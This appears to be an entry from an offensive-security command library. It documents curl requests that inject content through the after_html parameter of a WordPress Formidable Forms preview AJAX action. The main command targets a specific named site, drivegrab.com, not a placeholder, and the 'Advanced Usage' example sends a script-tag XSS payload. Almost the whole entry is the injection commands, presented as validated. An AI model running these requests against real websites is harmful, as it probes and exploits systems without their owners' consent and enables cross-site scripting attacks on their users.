---
id: cmd-curl-after-html-002
data: >-
  curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data
  'action=frm_forms_preview&after_html=hello world'
tags:
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:09.991Z'
verified: false
validated: true
submitted: true
---
# curl-test-after-html

## Command

```bash
curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=hello world'
```

## Description

Tests injection of custom HTML via after_html parameter to confirm rendering after the form.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode | Yes |
| `-i` | Include headers | Yes |
| `--data` | POST with action and after_html | Yes |
| `after_html` | Custom content to append | Yes |

## Examples

### Basic Usage

```bash
curl -s -i 'https://target.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=test'
```

### Advanced Usage

```bash
curl -s -i 'https://target.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=<script>alert(1)</script>'
```

## Expected Output

HTML response with 'hello world' text post-form.

## Related

- [[Related Procedure: Test-Shortcode-Injection-in-Preview]]
